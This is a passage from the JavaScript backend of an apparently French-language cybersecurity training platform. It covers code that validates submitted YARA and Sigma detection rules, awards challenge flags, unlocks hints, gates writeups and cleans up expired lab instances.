            validSyntax = (text.includes('rule ') || text.startsWith('rule')) && text.includes('strings:') && text.includes('condition:');
          } else {
            validSyntax = text.includes('detection:') && text.includes('condition:');
          }

          if (!validSyntax) {
            return {
              success: false,
              valid: false,
              message: isYara
                ? 'Syntaxe YARA invalide : les blocs "rule", "strings:" et "condition:" sont obligatoires.'
                : 'Syntaxe Sigma invalide : les sections "detection:" et "condition:" sont obligatoires.'
            };
          }

          const keywords = Array.isArray(det.keywords_required) ? det.keywords_required : [];
          const missingKeywords = keywords.filter(kw => !text.includes(kw.toLowerCase()));
          if (missingKeywords.length > 0) {
            return {
              success: false,
              valid: false,
              message: `La règle doit contenir les indicateurs clés suivants : ${missingKeywords.join(', ')}.`
            };
          }

          const flag = det.flag || 'SIGMA{DETECTION_RULE_VALIDATED_SUCCESS}';
          const sub = this.submitFlag(challengeId, 't5', flag, 'current_player', '127.0.0.1', playerId);
          return {
            success: true,
            valid: true,
            flag: flag,
            points_awarded: sub.points_awarded || 25,
            message: `✔ Règle ${isYara ? 'YARA' : 'Sigma'} validée avec succès ! Les alertes de détection sont opérationnelles.`
          };
        }
      }
    } catch (e) {}

    return {
      success: false,
      valid: false,
      message: 'Challenge inconnu pour validation de règle SOC.'
    };
  }

  // 9. Déblocage d'indice 100% gratuit et progressif (TryHackMe Style)
  unlockHint(challengeId, hintIndex) {
    const ch = this.db.prepare('SELECT * FROM training_challenges WHERE id = ?').get(challengeId);
    if (!ch) throw new Error('Challenge introuvable.');

    const hints = JSON.parse(ch.hints_json || '[]');
    const hint = hints[hintIndex];
    if (!hint) throw new Error('Indice introuvable.');

    let prog = this.db.prepare('SELECT * FROM training_user_progress WHERE challenge_id = ?').get(challengeId);
    if (!prog) {
      prog = { unlocked_hints: '[]' };
    }

    const unlocked = new Set(JSON.parse(prog.unlocked_hints || '[]'));
    unlocked.add(hintIndex);

    this.db.prepare(`
      INSERT INTO training_user_progress (challenge_id, status, tasks_completed, unlocked_hints, writeup_unlocked, attempts_count, points_earned, solved_at, updated_at)
      VALUES (?, 'in_progress', '[]', ?, 0, 0, 0, NULL, ?)
      ON CONFLICT(challenge_id) DO UPDATE SET
        unlocked_hints = excluded.unlocked_hints,
        updated_at = excluded.updated_at
    `).run(challengeId, JSON.stringify([...unlocked]), new Date().toISOString());

    const user = this.db.prepare('SELECT gems FROM user_state WHERE id = ?').get('current_player') || { gems: 100 };

    return {
      hint: hint.content,
      cost: 0,
      cost_paid: 0,
      is_free: true,
      already_unlocked: false,
      remaining_gems: user.gems || 100
    };
  }

  // 10. Récupération du Writeup / Solution détaillée
  getWriteup(challengeId) {
    const ch = this.db.prepare('SELECT * FROM training_challenges WHERE id = ?').get(challengeId);
    if (!ch) throw new Error('Challenge introuvable.');

    const prog = this.db.prepare('SELECT * FROM training_user_progress WHERE challenge_id = ?').get(challengeId);
    const isSolved = prog && (prog.status === 'solved' || prog.writeup_unlocked === 1);

    if (!isSolved) {
      throw new Error('Le writeup est confidentiel et verrouillé jusqu\'à la résolution complète du challenge.');
    }

    return {
      challenge_id: challengeId,
      title: ch.title,
      writeup: ch.writeup_markdown || 'Aucun writeup détaillé n\'a encore été rédigé pour ce challenge.'
    };
  }

  // 11. Nettoyeur automatique de machines expirées (toutes les 60 secondes)
  startGarbageCollector() {
    setInterval(() => {
      try {
        const now = new Date().toISOString();
        const expired = this.db.prepare('SELECT challenge_id FROM training_instances WHERE status = ? AND expires_at <= ?').all('running', now);
        for (const exp of expired) {
          this.stopInstance(exp.challenge_id);
        }
      } catch (e) {}
    }, 60000);
  }
}

module.exports = TrainingManager;
